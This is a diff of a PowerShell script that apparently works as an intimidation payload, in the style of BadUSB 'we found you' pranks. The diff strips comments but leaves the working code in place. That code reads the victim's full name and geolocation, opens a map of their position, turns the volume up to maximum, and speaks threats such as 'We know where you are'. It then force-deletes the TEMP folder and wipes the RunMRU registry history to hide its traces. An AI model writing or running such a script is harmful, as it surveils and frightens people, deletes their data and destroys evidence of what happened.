@@ -2,12 +2,12 @@ function Get-fullName {
     try {
         $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
         $fullName = ("$fullName").ToString().Replace("Full Name", "").Trim()
-        Start-Sleep -Milliseconds 500 # Added delay after name retrieval
+        Start-Sleep -Milliseconds 500
         return $fullName
     }
     catch {
         Write-Error "No name was detected"
-        Start-Sleep -Seconds 1 # Delay on error
+        Start-Sleep -Seconds 1
         return $env:UserName
     }
 }
@@ -17,10 +17,10 @@ function Get-GeoLocation {
         Add-Type -AssemblyName System.Device
         $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
         $GeoWatcher.Start()
-        Start-Sleep -Seconds 2 # Initial delay for geolocation start
+        Start-Sleep -Seconds 2
         $timeout = 0
         while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($timeout -lt 20)) {
-            Start-Sleep -Milliseconds 500 # Increased from 100ms
+            Start-Sleep -Milliseconds 500
             $timeout++
         }
         if ($GeoWatcher.Permission -eq 'Denied' -or $GeoWatcher.Status -ne 'Ready') {
@@ -39,19 +39,18 @@ function Pause-Script {
     $originalPOS = [System.Windows.Forms.Cursor]::Position.X
     $o = New-Object -ComObject WScript.Shell
     while ($true) {
-        $pauseTime = 5 # Increased from 3 seconds
+        $pauseTime = 5
         if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
-            Start-Sleep -Seconds 1 # Final confirmation delay
+            Start-Sleep -Seconds 1
             break
-        }
-        else {
+        } else {
             $o.SendKeys("{CAPSLOCK}")
             Start-Sleep -Seconds $pauseTime
         }
     }
 }
 
-# Main execution flow with added delays
+# Main execution flow
 
 Start-Sleep -Seconds 10 # Initial warm-up delay
 
@@ -62,26 +61,23 @@ $Lon = if ($GL[1] -match "Lon:(.+)") { $Matches[1] } else { "Unknown" }
 
 Pause-Script
 
-# Browser launch with extended delay
 Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
-Start-Sleep -Seconds 5 # Extended from 3 seconds
+Start-Sleep -Seconds 5
 
-# Volume adjustment with delays
 $k = [Math]::Ceiling(100/2)
 $o = New-Object -ComObject WScript.Shell
 for ($i = 0; $i -lt $k; $i++) {
     $o.SendKeys([char]175)
-    Start-Sleep -Milliseconds 50 # Added between volume keypresses
+    Start-Sleep -Milliseconds 50
 }
 
-# Speech synthesis with pauses
 $s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
 
 $FN = Get-fullName
 
 $s.Speak("We found you $FN")
-Start-Sleep -Seconds 1 # Pause between phrases
+Start-Sleep -Seconds 1
 $s.Speak("We know where you are")
 Start-Sleep -Seconds 1
 $s.Speak("We are everywhere")
@@ -89,9 +85,8 @@ Start-Sleep -Seconds 1
 $s.Speak("We do not forgive, we do not forget")
 Start-Sleep -Seconds 1
 $s.Speak("Expect us")
-Start-Sleep -Seconds 2 # Final pause before cleanup
+Start-Sleep -Seconds 2
 
-# Cleanup with verification delays
 Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
